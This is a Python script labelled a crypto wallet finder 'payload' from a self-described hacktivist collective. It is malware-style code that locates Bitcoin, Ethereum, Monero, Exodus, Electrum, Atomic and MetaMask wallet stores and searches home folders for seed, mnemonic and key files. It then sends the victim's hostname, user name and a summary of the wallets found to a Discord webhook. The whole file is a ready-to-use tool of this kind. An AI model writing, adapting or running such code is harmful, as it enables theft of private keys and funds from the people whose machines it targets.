#!/usr/bin/env python3
"""
Cryptocurrency Wallet Finder Payload
Searches for cryptocurrency wallet files and data
⚡ EchoDead - Hacktivist Collective
"""

import os
import sys
import platform
from datetime import datetime
import json

# Add parent directory to path
sys.path.insert(0, os.path.dirname(__file__))
try:
    from webhook_utils import send_to_discord
    WEBHOOK_AVAILABLE = True
except ImportError:
    WEBHOOK_AVAILABLE = False

# Cryptocurrency wallet locations and patterns
WALLET_SIGNATURES = {
    "Bitcoin Core": {
        "windows": os.path.join(os.getenv('APPDATA', ''), 'Bitcoin'),
        "linux": os.path.expanduser("~/.bitcoin"),
        "darwin": os.path.expanduser("~/Library/Application Support/Bitcoin"),
        "files": ["wallet.dat", "*.dat"],
    },
    "Ethereum": {
        "windows": os.path.join(os.getenv('APPDATA', ''), 'Ethereum'),
        "linux": os.path.expanduser("~/.ethereum"),
        "darwin": os.path.expanduser("~/Library/Ethereum"),
        "files": ["keystore", "UTC--*"],
    },
    "Litecoin": {
        "windows": os.path.join(os.getenv('APPDATA', ''), 'Litecoin'),
        "linux": os.path.expanduser("~/.litecoin"),
        "darwin": os.path.expanduser("~/Library/Application Support/Litecoin"),
        "files": ["wallet.dat"],
    },
    "Monero": {
        "windows": os.path.join(os.getenv('APPDATA', ''), 'Monero'),
        "linux": os.path.expanduser("~/.bitmonero"),
        "darwin": os.path.expanduser("~/Library/Application Support/Monero"),
        "files": ["*.keys", "*.address.txt"],
    },
    "Dogecoin": {
        "windows": os.path.join(os.getenv('APPDATA', ''), 'DogeCoin'),
        "linux": os.path.expanduser("~/.dogecoin"),
        "darwin": os.path.expanduser("~/Library/Application Support/Dogecoin"),
        "files": ["wallet.dat"],
    },
    "Electrum": {
        "windows": os.path.join(os.getenv('APPDATA', ''), 'Electrum', 'wallets'),
        "linux": os.path.expanduser("~/.electrum/wallets"),
        "darwin": os.path.expanduser("~/.electrum/wallets"),
        "files": ["*"],
    },
    "Exodus": {
        "windows": os.path.join(os.getenv('APPDATA', ''), 'Exodus'),
        "linux": os.path.expanduser("~/.config/Exodus"),
        "darwin": os.path.expanduser("~/Library/Application Support/Exodus"),
        "files": ["exodus.wallet", "seed.seco"],
    },
    "Atomic Wallet": {
        "windows": os.path.join(os.getenv('APPDATA', ''), 'atomic'),
        "linux": os.path.expanduser("~/.atomic"),
        "darwin": os.path.expanduser("~/Library/Application Support/atomic"),
        "files": ["*.adat"],
    },
    "Metamask": {
        "windows": os.path.join(os.getenv('LOCALAPPDATA', ''), 'Google', 'Chrome', 'User Data', 'Default', 'Local Extension Settings', 'nkbihfbeogaeaoehlefnkodbefgpgknn'),
        "linux": os.path.expanduser("~/.config/google-chrome/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"),
        "darwin": os.path.expanduser("~/Library/Application Support/Google/Chrome/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"),
        "files": ["*"],
    },
}

def get_directory_size(path):
    """Calculate total size of directory"""
    total_size = 0
    try:
        for dirpath, dirnames, filenames in os.walk(path):
            for filename in filenames:
                filepath = os.path.join(dirpath, filename)
                try:
                    total_size += os.path.getsize(filepath)
                except:
                    pass
    except:
        pass
    return total_size

def search_wallet_directories():
    """Search for cryptocurrency wallet directories"""
    found_wallets = []
    system_platform = platform.system().lower()
    
    # Map platform names
    platform_map = {
        'windows': 'windows',
        'linux': 'linux',
        'darwin': 'darwin',
    }
    
    current_platform = platform_map.get(system_platform, 'linux')
    
    print(f"🔍 Searching for cryptocurrency wallets on {platform.system()}...\n")
    
    for wallet_name, locations in WALLET_SIGNATURES.items():
        wallet_path = locations.get(current_platform)
        
        if wallet_path and os.path.exists(wallet_path):
            # Get directory info
            try:
                size = get_directory_size(wallet_path)
                file_count = sum([len(files) for _, _, files in os.walk(wallet_path)])
                
                # List important files
                important_files = []
                for root, dirs, files in os.walk(wallet_path):
                    for file in files:
                        file_lower = file.lower()
                        if any(keyword in file_lower for keyword in ['wallet', 'key', 'seed', '.dat', 'adat', 'seco']):
                            important_files.append(os.path.join(root, file))
                            if len(important_files) >= 10:  # Limit to 10 files
                                break
                    if len(important_files) >= 10:
                        break
                
                wallet_info = {
                    "name": wallet_name,
                    "path": wallet_path,
                    "size": size,
                    "file_count": file_count,
                    "important_files": important_files[:5],  # First 5 files
                }
                
                found_wallets.append(wallet_info)
                
                print(f"✅ Found: {wallet_name}")
                print(f"   Path: {wallet_path}")
                print(f"   Size: {size:,} bytes ({size / 1024 / 1024:.2f} MB)")
                print(f"   Files: {file_count}")
                if important_files:
                    print(f"   Key files: {len(important_files)}")
                    for f in important_files[:3]:
                        print(f"     • {os.path.basename(f)}")
                print()
            
            except Exception as e:
                print(f"⚠️  {wallet_name}: Found but error reading - {e}")
        
    return found_wallets

def search_wallet_files_in_common_locations():
    """Search common locations for wallet-related files"""
    search_paths = []
    
    if platform.system() == "Windows":
        search_paths = [
            os.getenv('USERPROFILE'),
            os.getenv('APPDATA'),
            os.getenv('LOCALAPPDATA'),
            os.path.join(os.getenv('USERPROFILE', ''), 'Documents'),
            os.path.join(os.getenv('USERPROFILE', ''), 'Downloads'),
            os.path.join(os.getenv('USERPROFILE', ''), 'Desktop'),
        ]
    else:
        search_paths = [
            os.path.expanduser("~"),
            os.path.expanduser("~/Documents"),
            os.path.expanduser("~/Downloads"),
            os.path.expanduser("~/Desktop"),
        ]
    
    wallet_files = []
    wallet_keywords = ['wallet', 'seed', 'mnemonic', 'private', 'keystore', '.dat']
    
    print("🔍 Searching common locations for wallet files...\n")
    
    for search_path in search_paths:
        if not search_path or not os.path.exists(search_path):
            continue
        
        try:
            for root, dirs, files in os.walk(search_path):
                # Limit depth to avoid long scans
                depth = root[len(search_path):].count(os.sep)
                if depth > 3:
                    continue
                
                for file in files:
                    file_lower = file.lower()
                    if any(keyword in file_lower for keyword in wallet_keywords):
                        file_path = os.path.join(root, file)
                        try:
                            file_size = os.path.getsize(file_path)
                            wallet_files.append({
                                "path": file_path,
                                "size": file_size,
                                "name": file,
                            })
                            print(f"  📄 {file} ({file_size:,} bytes)")
                        except:
                            pass
                
                if len(wallet_files) >= 20:  # Limit results
                    break
        except Exception as e:
            pass
    
    return wallet_files

def main():
    print("=" * 70)
    print("CRYPTOCURRENCY WALLET FINDER PAYLOAD")
    print("=" * 70)
    print(f"\nExecution Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"Platform: {platform.system()} {platform.release()}")
    print(f"User: {os.getlogin() if hasattr(os, 'getlogin') else os.getenv('USER', 'Unknown')}")
    print(f"Hostname: {platform.node()}\n")
    
    # Search for wallet directories
    print("=" * 70)
    print("SEARCHING WALLET DIRECTORIES")
    print("=" * 70 + "\n")
    
    found_wallets = search_wallet_directories()
    
    if not found_wallets:
        print("ℹ️  No cryptocurrency wallet directories found\n")
    
    # Search for wallet files in common locations
    print("=" * 70)
    print("SEARCHING WALLET FILES")
    print("=" * 70 + "\n")
    
    wallet_files = search_wallet_files_in_common_locations()
    
    if not wallet_files:
        print("ℹ️  No wallet-related files found in common locations\n")
    
    # Summary
    print("=" * 70)
    print("SUMMARY")
    print("=" * 70)
    print(f"\nWallet Directories Found: {len(found_wallets)}")
    print(f"Wallet Files Found: {len(wallet_files)}")
    
    if found_wallets:
        print("\n📊 Wallets by Type:")
        for wallet in found_wallets:
            print(f"  • {wallet['name']}: {wallet['size'] / 1024 / 1024:.2f} MB, {wallet['file_count']} files")
    
    # Prepare report for Discord
    report = {
        "Platform": f"{platform.system()} {platform.release()}",
        "Hostname": platform.node(),
        "User": os.getlogin() if hasattr(os, 'getlogin') else os.getenv('USER', 'Unknown'),
        "Wallet Directories": len(found_wallets),
        "Wallet Files": len(wallet_files),
        "Timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
    }
    
    # Add wallet details
    if found_wallets:
        wallet_summary = []
        for wallet in found_wallets[:5]:  # First 5
            wallet_summary.append(
                f"{wallet['name']}: {wallet['size'] / 1024 / 1024:.2f} MB"
            )
        report["Found Wallets"] = ", ".join(wallet_summary)
    
    # Send to Discord
    if WEBHOOK_AVAILABLE:
        print("\n📤 Sending report to Discord...")
        if send_to_discord("💰 Crypto Wallet Finder Report", report):
            print("✅ Report sent successfully!")
        else:
            print("⚠️  Discord webhook not configured")
    else:
        print("\n⚠️  Webhook module not available")
    
    print("\n✅ Cryptocurrency wallet search complete!")
    
    if found_wallets or wallet_files:
        print("\n⚠️  IMPORTANT: Wallet files contain private keys.")
        print("   Handle with extreme care and proper authorization.")

if __name__ == "__main__":
    main()
